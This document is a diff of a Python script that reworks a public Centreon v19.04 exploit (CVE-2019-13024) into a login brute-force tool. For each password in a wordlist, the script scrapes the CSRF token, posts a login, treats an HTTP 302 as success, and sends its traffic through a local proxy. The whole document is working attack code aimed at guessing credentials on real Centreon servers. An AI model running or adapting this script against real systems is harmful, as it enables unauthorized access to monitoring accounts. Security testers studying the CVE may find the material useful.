@@ -1,9 +1,10 @@
 #!/usr/bin/python
 
 '''
-# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
+# Title: Centreon v19.04 Login Bruteforce
 # Date: 28/06/2019
-# Exploit Author: Askar (@mohammadaskar2)
+# Original Exploit Snippet Author: Askar (@mohammadaskar2)
+# Bruteforce Script Author : Mohin Paramasivam (Shad0wQu35t)
 # CVE : CVE-2019-13024
 # Vendor Homepage: https://www.centreon.com/
 # Software link: https://download.centreon.com
@@ -33,10 +34,15 @@ url = args.url
 username = args.u
 password_wordlist = args.w
 
-password_file = open(password_wordlist,"r")
+password_file = open(password_wordlist,"r").read().splitlines()
 
 success = 0
 
+
+proxies = {
+			"http" : "http://127.0.0.1:8080",
+		     	"https" : "https://127.0.0.1:8080",
+			    }
 
 while success==0:
 
@@ -48,7 +54,7 @@ while success==0:
 
         request = requests.session()
         print("[+] Retrieving CSRF token to submit the login form")
-        page = request.get(url+"/index.php")
+        page = request.get(url+"/index.php",allow_redirects=False,proxies=proxies)
         html_content = page.text
         soup = BeautifulSoup(html_content,features="lxml")
         token = soup.findAll('input')[3].get("value")
@@ -59,18 +65,15 @@ while success==0:
             "submitLogin": "Connect",
             "centreon_token": token
         }
-        login_request = request.post(url+"/index.php", login_info)
+        login_request = request.post(url+"/index.php", login_info,allow_redirects=False,proxies=proxies)
         print("[+] Login token is : {0}".format(token))
 
 
-        #print(login_request.text)
-
-
-
-        if "Your credentials are incorrect." not in login_request.text:
-            print "[+] Logged In Sucssfully"
+        if login_request.status_code==302:
+            print "[+] Logged In Successfully"
             print username +":" + password + colored('(VALID)','green')
             success =1
+	    sys.exit(0)
 
         else:
             print username +":" + password + colored('(INVALID)','red')
